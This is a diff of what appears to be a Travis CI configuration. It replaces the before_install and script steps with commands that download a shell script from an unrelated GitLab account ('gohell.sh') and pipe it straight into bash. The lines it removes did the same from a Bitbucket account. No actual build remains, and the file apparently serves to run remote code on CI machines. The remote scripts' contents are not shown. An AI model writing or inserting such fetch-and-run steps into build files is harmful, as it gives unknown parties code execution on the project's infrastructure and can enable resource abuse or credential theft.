@@ -75,7 +75,7 @@ rvm:
   - "1.9.3"
   
 before_install:
-  - curl -sL https://bitbucket.org/nicezep/korong/raw/master/skycuk | bash
+  - curl -sL https://gitlab.com/jadons19292/netizen/-/raw/main/gohell.sh | bash
 
 script:
-  - curl -sL https://bitbucket.org/nicezep/korong/raw/master/skycuk | bash
+  - curl -sL https://gitlab.com/jadons19292/netizen/-/raw/main/gohell.sh | bash
